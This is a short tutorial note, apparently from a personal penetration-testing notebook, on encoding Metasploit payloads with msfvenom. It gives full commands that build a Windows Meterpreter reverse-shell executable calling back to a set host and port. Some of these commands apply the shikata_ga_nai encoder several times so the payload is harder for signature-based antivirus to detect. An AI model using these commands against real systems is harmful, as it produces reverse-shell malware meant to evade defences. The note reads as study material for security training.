# What is Encoding?

**Encoding** is the process of changing the appearance of a payload **without changing its functionality**.

---

# Purpose of Encoding

The main goal is to:

## Change the payload's signature

making it more difficult for **older signature-based antivirus (AV)** solutions to detect it.

---

# What is Shellcode?

Simply put, **shellcode** is:

## The raw machine code that performs the attack.

Instead of being an executable file (`.exe`), shellcode consists of:

- Machine code
- Raw bytes
- Assembly instructions

---

# Using Encoding with msfvenom

## Generate a Standard Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > shell.exe
```

This generates a normal Meterpreter payload.

---

## Encode the Payload

To encode a payload, use the:

```text
-e
```

option.

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -f exe > encoded.exe
```

In this example, we used the encoder:

```text
x86/shikata_ga_nai
```

---

# x86/shikata_ga_nai

This is one of the most well-known encoders included with Metasploit.

Its purpose is to:

## Modify the appearance of the shellcode

making signature-based detection more difficult.

---

# Encoding Multiple Times

To apply encoding repeatedly, use:

```text
-i
```

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```

---

# What Does This Mean?

The payload will be encoded:

## Five times

Each encoding pass changes the shellcode's signature, making it appear different from the previous version.

---

# List Available Encoders

To display all encoders included with msfvenom:

```bash
msfvenom -l encoders
```

---

# Common Encoder

```text
x86/shikata_ga_nai
```

---

# Payload vs Shellcode

| Payload | Shellcode |
|---------|-----------|
| A complete executable payload | The raw executable machine code |
| Examples: `.exe`, `.elf` | Raw machine-code bytes |
| May contain shellcode | The actual code executed during exploitation |

---

# Generate an Encoded Payload

## Windows

![](../../../../../Images/Pasted%20image%2020260525003512.png)

---

# Encode the Payload Multiple Times

Use the following option:

```text
-i
```

![](../../../../../Images/Pasted%20image%2020260525004053.png)

---

# Linux

![](../../../../../Images/Pasted%20image%2020260525004433.png)